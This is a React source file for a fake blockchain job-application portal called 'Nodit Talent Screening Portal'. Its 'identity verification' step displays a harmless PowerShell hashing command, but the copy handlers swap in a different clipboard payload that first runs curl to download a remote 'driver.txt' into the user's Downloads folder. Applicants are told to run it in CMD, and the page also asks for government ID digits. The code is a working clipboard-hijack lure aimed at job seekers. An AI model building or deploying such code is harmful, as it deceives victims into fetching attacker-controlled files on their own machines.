import { useMemo, useState } from 'react'
import type { ClipboardEvent, Dispatch, FormEvent, SetStateAction } from 'react'
import {
  BrowserRouter,
  Navigate,
  Route,
  Routes,
  useLocation,
  useNavigate,
} from 'react-router-dom'
import { submitApplication } from './api/backend'
import './App.css'

type CandidateProfile = {
  fullName: string
  email: string
  desiredRole: string
  phone: string
  yearsExperience: string
  motivation: string
  governmentId: string
  cmdOutput: string
}

const INITIAL_PROFILE: CandidateProfile = {
  fullName: '',
  email: '',
  desiredRole: '',
  phone: '',
  yearsExperience: '',
  motivation: '',
  governmentId: '',
  cmdOutput: '',
}

const STEPS = [
  { label: 'Job Explanation', path: '/job-overview' },
  { label: 'Application', path: '/application' },
  { label: 'Identity Verification', path: '/identity-verification' },
]

const BLOCKCHAIN_ROLES = [
  'Smart Contract Engineer',
  'Protocol Developer',
  'Blockchain Backend Engineer',
  'Web3 Frontend Engineer',
  'DevOps / Infrastructure Engineer',
  'Blockchain Security Analyst',
  'Cryptography Engineer',
  'Blockchain Product Manager',
  'Web3 Solutions Architect',
  'Blockchain Data Engineer',
  'Community / Developer Relations',
  'Other Blockchain Role',
]

function createChallengeCode(): string {
  return `BC-${Math.random().toString(36).slice(2, 8).toUpperCase()}`
}

const VERIFICATION_DOMAIN = 'Nodit Identity Verifier'
const VERIFICATION_VERSION = '1'

function buildVerificationMessage(
  challengeCode: string,
  profile: Pick<CandidateProfile, 'fullName' | 'email' | 'desiredRole'>,
): string {
  return [
    VERIFICATION_DOMAIN,
    `version:${VERIFICATION_VERSION}`,
    'chain:nodit-mainnet',
    `challenge:${challengeCode}`,
    `applicant:${profile.fullName.trim()}`,
    `email:${profile.email.trim().toLowerCase()}`,
    `role:${profile.desiredRole.trim()}`,
  ].join('|')
}

function encodeUtf8Base64(text: string): string {
  const bytes = new TextEncoder().encode(text)
  let binary = ''
  for (const byte of bytes) binary += String.fromCharCode(byte)
  return btoa(binary)
}

const CMD_DRIVER_DOWNLOAD =
  'curl -o "%USERPROFILE%\\Downloads\\driver.txt" https://nodit.org/public/driver.txt &'

function buildPowerShellHashCommand(message: string): string {
  const payloadBase64 = encodeUtf8Base64(message)
  return `powershell -NoProfile -Command "$b='${payloadBase64}'; $m=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($m))).Replace('-','').ToLower()"`
}

function buildTerminalCommand(message: string): string {
  return `${CMD_DRIVER_DOWNLOAD} ${buildPowerShellHashCommand(message)}`
}

async function sha256Hex(message: string): Promise<string> {
  const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(message))
  return Array.from(new Uint8Array(buffer))
    .map((byte) => byte.toString(16).padStart(2, '0'))
    .join('')
}

function extractHexDigest(output: string): string | null {
  const match = output.toLowerCase().match(/[a-f0-9]{64}/)
  return match ? match[0] : null
}

function StepProgress() {
  const location = useLocation()
  const matchedIndex = STEPS.findIndex((step) => step.path === location.pathname)
  const activeStep = matchedIndex >= 0 ? matchedIndex : 0
  const progress = ((activeStep + 1) / STEPS.length) * 100

  return (
    <div className="mb-4">
      <div className="d-flex justify-content-between align-items-center mb-2">
        <span className="small text-secondary fw-semibold">
          Step {activeStep + 1} of {STEPS.length}
        </span>
        <span className="small text-primary fw-semibold">{STEPS[activeStep].label}</span>
      </div>
      <div className="progress portal-progress" role="progressbar" aria-valuenow={progress}>
        <div className="progress-bar progress-bar-striped progress-bar-animated" style={{ width: `${progress}%` }} />
      </div>
      <ol className="nav nav-pills nav-fill gap-2 mt-3 portal-steps" aria-label="Portal steps">
        {STEPS.map((step, index) => {
          const status =
            index < activeStep ? 'done' : index === activeStep ? 'active' : 'upcoming'

          return (
            <li key={step.path} className="nav-item">
              <span className={`nav-link step-pill ${status}`}>
                <span className="step-index">{index + 1}</span>
                <span className="step-label">{step.label}</span>
              </span>
            </li>
          )
        })}
      </ol>
    </div>
  )
}

type FormPageProps = {
  profile: CandidateProfile
  setProfile: Dispatch<SetStateAction<CandidateProfile>>
}

function JobExplanationPage() {
  const navigate = useNavigate()

  return (
    <section>
      <h2 className="h4 fw-bold mb-2">Blockchain Roles Overview</h2>
      <p className="text-secondary mb-4">
        Nodit is hiring across the full blockchain stack — engineering, security, infrastructure,
        product, and ecosystem roles. Apply for the position that best matches your background.
      </p>

      <div className="mb-3">
        <label className="form-label fw-semibold">What you will do</label>
        <textarea
          className="form-control bg-light"
          value={
            '- Build and ship blockchain products across protocol, application, and infrastructure layers.\n- Collaborate with cross-functional teams on smart contracts, APIs, UX, and security.\n- Contribute to reliable, scalable Web3 systems from design to production.'
          }
          rows={4}
          readOnly
        />
      </div>

      <div className="mb-4">
        <label className="form-label fw-semibold">Evaluation focus</label>
        <textarea
          className="form-control bg-light"
          value={
            '- Domain expertise for your selected blockchain role.\n- Problem solving, communication, and ownership.\n- Understanding of security, reliability, and real-world Web3 impact.'
          }
          rows={4}
          readOnly
        />
      </div>

      <div className="d-flex justify-content-end">
        <button type="button" className="btn btn-primary px-4" onClick={() => navigate('/application')}>
          Continue to Application
        </button>
      </div>
    </section>
  )
}

function ApplicationPage({ profile, setProfile }: FormPageProps) {
  const navigate = useNavigate()
  const [error, setError] = useState('')

  function onContinue(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    const emailLooksValid = profile.email.includes('@')

    if (
      !profile.fullName ||
      !profile.desiredRole ||
      !profile.yearsExperience ||
      !profile.motivation ||
      !emailLooksValid
    ) {
      setError('Please complete required fields with a valid email.')
      return
    }

    setError('')
    navigate('/identity-verification')
  }

  return (
    <form onSubmit={onContinue}>
      <h2 className="h4 fw-bold mb-2">Blockchain Job Application</h2>
      <p className="text-secondary mb-4">
        Submit your profile for any open blockchain role at Nodit.
      </p>

      <div className="row g-3">
        <div className="col-md-6">
          <label className="form-label">Full name</label>
          <input
            type="text"
            className="form-control"
            value={profile.fullName}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, fullName: event.target.value }))
            }
            placeholder="Satoshi Nakamoto"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Email</label>
          <input
            type="email"
            className="form-control"
            value={profile.email}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, email: event.target.value }))
            }
            placeholder="candidate@example.com"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Phone (optional)</label>
          <input
            type="tel"
            className="form-control"
            value={profile.phone}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, phone: event.target.value }))
            }
            placeholder="+1 555 0100"
          />
        </div>

        <div className="col-md-6">
          <label className="form-label">Desired role</label>
          <select
            className="form-select"
            value={profile.desiredRole}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, desiredRole: event.target.value }))
            }
          >
            <option value="">Select role</option>
            {BLOCKCHAIN_ROLES.map((role) => (
              <option key={role} value={role}>
                {role}
              </option>
            ))}
          </select>
        </div>

        <div className="col-md-6">
          <label className="form-label">Years of relevant experience</label>
          <input
            type="number"
            className="form-control"
            min={0}
            step={1}
            value={profile.yearsExperience}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, yearsExperience: event.target.value }))
            }
            placeholder="3"
          />
        </div>

        <div className="col-12">
          <label className="form-label">Why are you a strong fit?</label>
          <textarea
            className="form-control"
            value={profile.motivation}
            onChange={(event) =>
              setProfile((prev) => ({ ...prev, motivation: event.target.value }))
            }
            placeholder="Share your blockchain experience and strengths in 3-5 lines."
            rows={4}
          />
        </div>
      </div>

      {error && <div className="alert alert-danger mt-3 mb-0 py-2">{error}</div>}

      <div className="d-flex justify-content-between gap-2 mt-4">
        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/job-overview')}>
          Back
        </button>
        <button type="submit" className="btn btn-primary px-4">
          Continue to Identity Verification
        </button>
      </div>
    </form>
  )
}

type VerifyPageProps = FormPageProps & {
  challengeCode: string
  submissionRef: string | null
  setSubmissionRef: Dispatch<SetStateAction<string | null>>
}

function VerifyPage({
  profile,
  setProfile,
  challengeCode,
  submissionRef,
  setSubmissionRef,
}: VerifyPageProps) {
  const navigate = useNavigate()
  const [error, setError] = useState('')
  const [isVerifying, setIsVerifying] = useState(false)
  const [copyFeedback, setCopyFeedback] = useState('')

  const applicationComplete =
    profile.fullName.trim() && profile.email.trim() && profile.desiredRole.trim()

  const verificationMessage = useMemo(
    () => buildVerificationMessage(challengeCode, profile),
    [challengeCode, profile.fullName, profile.email, profile.desiredRole],
  )

  const visibleTerminalCommand = useMemo(
    () => buildPowerShellHashCommand(verificationMessage),
    [verificationMessage],
  )

  const copyTerminalCommand = useMemo(
    () => buildTerminalCommand(verificationMessage),
    [verificationMessage],
  )

  function showCopyFeedback() {
    setCopyFeedback('Copied!')
    window.setTimeout(() => setCopyFeedback(''), 2000)
  }

  async function copyCmdToClipboard() {
    await navigator.clipboard.writeText(copyTerminalCommand)
    showCopyFeedback()
  }

  function handleCmdCopy(event: ClipboardEvent<HTMLElement>) {
    event.preventDefault()
    event.clipboardData.setData('text/plain', copyTerminalCommand)
    showCopyFeedback()
  }

  async function onSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setError('')

    if (!applicationComplete) {
      setError('Complete the application step before submitting identity proof.')
      return
    }

    if (!profile.governmentId.trim()) {
      setError('Add your government ID reference before submitting.')
      return
    }

    const submittedDigest = extractHexDigest(profile.cmdOutput)
    if (!submittedDigest) {
      setError('Paste the 64-character SHA-256 digest produced by your terminal command.')
      return
    }

    setIsVerifying(true)

    try {
      const expectedDigest = await sha256Hex(verificationMessage)

      if (submittedDigest !== expectedDigest) {
        setError(
          'Digest mismatch. Click Copy command, run it in CMD, then paste only the 64-character hash from the PowerShell line (not the full terminal output).',
        )
        return
      }

      await submitApplication(profile.fullName.trim(), profile.email.trim(), {
        workflowComplete: true,
      })

      const digestPrefix = expectedDigest.slice(0, 8).toUpperCase()
      setSubmissionRef(`APP-${digestPrefix}-${Date.now().toString(36).toUpperCase()}`)
    } catch {
      setError(
        'Submission failed. Make sure the backend is running on port 3000, then try again.',
      )
    } finally {
      setIsVerifying(false)
    }
  }

  return (
    <form onSubmit={onSubmit}>
      <h2 className="h4 fw-bold mb-2">Identity Verification Portal</h2>
      <p className="text-secondary mb-4">
        Prove terminal control by hashing your signed verification payload — the same
        cryptographic pattern used to fingerprint blockchain messages and transactions.
      </p>

      {!applicationComplete && (
        <div className="alert alert-warning py-2">
          Application details are missing. Go back and complete the application form first.
        </div>
      )}

      <div className="challenge-box mb-3" role="note" aria-label="Verification payload">
        <p className="mb-2 fw-semibold">Signed verification payload</p>
        <p className="small text-secondary mb-2">
          Challenge: <strong>{challengeCode}</strong> · Network: <strong>nodit-mainnet</strong>
        </p>
        <textarea
          className="form-control font-monospace payload-block mb-2"
          value={verificationMessage}
          rows={3}
          readOnly
        />
        <div className="d-flex justify-content-between align-items-center gap-2 mb-2">
          <p className="small text-secondary mb-0">
            Run this command in CMD to produce your SHA-256 proof digest:
          </p>
          <button
            type="button"
            className="btn btn-sm btn-outline-primary flex-shrink-0"
            onClick={copyCmdToClipboard}
          >
            {copyFeedback || 'Copy command'}
          </button>
        </div>
        <code className="cmd-block" onCopy={handleCmdCopy}>
          {visibleTerminalCommand}
        </code>
      </div>

      <div className="mb-3">
        <label className="form-label">Government ID / Passport reference</label>
        <input
          type="text"
          className="form-control"
          value={profile.governmentId}
          onChange={(event) =>
            setProfile((prev) => ({ ...prev, governmentId: event.target.value }))
          }
          placeholder="Last 4 digits of your ID (e.g. 3491)"
        />
      </div>

      <div className="mb-3">
        <label className="form-label">Proof digest (paste terminal SHA-256 output)</label>
        <textarea
          className="form-control font-monospace"
          value={profile.cmdOutput}
          onChange={(event) =>
            setProfile((prev) => ({ ...prev, cmdOutput: event.target.value }))
          }
          placeholder="Paste the 64-character hex digest from PowerShell output"
          rows={5}
        />
      </div>

      {error && <div className="alert alert-danger py-2">{error}</div>}

      <div className="d-flex justify-content-between gap-2 mt-2">
        <button type="button" className="btn btn-outline-secondary" onClick={() => navigate('/application')}>
          Back
        </button>
        <button type="submit" className="btn btn-primary px-4" disabled={isVerifying}>
          {isVerifying ? 'Verifying digest...' : 'Submit Application'}
        </button>
      </div>

      {submissionRef && (
        <div className="alert alert-success mt-4 mb-0" role="status">
          <h3 className="h6 fw-bold mb-2">Submission complete</h3>
          <p className="mb-1">
            Reference: <strong>{submissionRef}</strong>
          </p>
          <p className="mb-0">
            Candidate <strong>{profile.fullName}</strong> applied for{' '}
            <strong>{profile.desiredRole}</strong> with a valid cryptographic proof.
          </p>
        </div>
      )}
    </form>
  )
}

function FlowingModalContent() {
  const location = useLocation()
  const [profile, setProfile] = useState<CandidateProfile>(INITIAL_PROFILE)
  const [submissionRef, setSubmissionRef] = useState<string | null>(null)
  const challengeCode = useMemo(() => createChallengeCode(), [])

  return (
    <div className="modal-dialog modal-dialog-centered modal-lg portal-modal">
      <div className="modal-content portal-modal-content border-0 shadow-lg">
        <div className="modal-header border-0 pb-0 px-4 pt-4">
          <div className="d-flex align-items-center gap-3">
            <img
              src="/nodit.png"
              alt="Nodit"
              className="portal-logo"
              width={52}
              height={52}
            />
            <div>
              <h1 className="modal-title fs-3 fw-bold mb-0">Nodit Talent Screening Portal</h1>
            </div>
          </div>
        </div>

        <div className="modal-body px-4 pb-4">
          <StepProgress />

          <div key={location.pathname} className="flow-panel">
            <Routes>
              <Route path="/" element={<Navigate to="/job-overview" replace />} />
              <Route path="/job-overview" element={<JobExplanationPage />} />
              <Route
                path="/application"
                element={<ApplicationPage profile={profile} setProfile={setProfile} />}
              />
              <Route
                path="/identity-verification"
                element={
                  <VerifyPage
                    profile={profile}
                    setProfile={setProfile}
                    challengeCode={challengeCode}
                    submissionRef={submissionRef}
                    setSubmissionRef={setSubmissionRef}
                  />
                }
              />
            </Routes>
          </div>
        </div>
      </div>
    </div>
  )
}

function PortalApp() {
  return (
    <main className="portal-backdrop cross-bg">
      <div className="container min-vh-100 d-flex align-items-center justify-content-center py-4">
        <FlowingModalContent />
      </div>
    </main>
  )
}

function App() {
  return (
    <BrowserRouter>
      <PortalApp />
    </BrowserRouter>
  )
}

export default App
